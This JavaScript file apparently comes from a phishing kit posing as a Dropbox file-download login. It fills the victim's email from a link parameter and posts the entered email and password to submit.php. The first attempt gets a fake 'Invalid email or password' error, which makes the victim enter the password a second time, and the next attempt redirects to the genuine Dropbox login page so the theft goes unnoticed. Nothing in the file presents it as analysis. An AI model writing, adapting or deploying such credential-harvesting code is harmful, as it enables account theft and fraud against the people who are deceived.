"use strict";

document.addEventListener("DOMContentLoaded", function () {
  var loginForm = document.loginform;
  var dlBtn = document.querySelectorAll("#download");
  var emailregex = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
  var counter = 0;
  dlBtn.forEach(function (btn) {
    return btn.addEventListener("click", function () {
      toggleModal();
    });
  });
  $(".close-icon").addEventListener("click", function () {
    toggleModal();
  });
  loginForm.addEventListener("submit", function (e) {
    e.preventDefault();
    if (!validateForm()) return;
    counter++;
    var formData = new FormData(document.loginform);
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "submit.php", true);

    xhr.onload = function () {
      setTimeout(function () {
        if (counter > 1) {
          return window.location.href = "https://www.dropbox.com/login";
        }

        $("#email-error").innerHTML = "Invalid email or password";
        loginForm.password.value = "";
      }, 3000);
    };

    xhr.send(formData);
  });

  function $(id) {
    return document.querySelector(id);
  }

  function getParameterByName(name, url) {
    if (!url) url = window.location.href;
    name = name.replace(/[\[\]]/g, "\\$&");
    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
        results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return "";
    return decodeURIComponent(results[2].replace(/\+/g, " "));
  }

  function toggleModal() {
    $(".login-container").classList.toggle("show");
  }

  function validateForm() {
    clearErrors();

    if (loginForm.email.value === "") {
      $("#email-error").innerHTML = "Please enter your email address";
      loginForm.email.focus();
      return false;
    }

    if (!emailregex.test(loginForm.email.value)) {
      $("#email-error").innerHTML = "Please enter a valid email";
      loginForm.email.focus();
      return false;
    }

    if (loginForm.password.value == "") {
      $("#password-error").innerHTML = "Please enter your password";
      loginForm.password.focus();
      return false;
    }

    return true;
  }

  function clearErrors() {
    $("#email-error").innerHTML = "";
    $("#password-error").innerHTML = "";
  }

  loginForm.email.value = getParameterByName("email");
});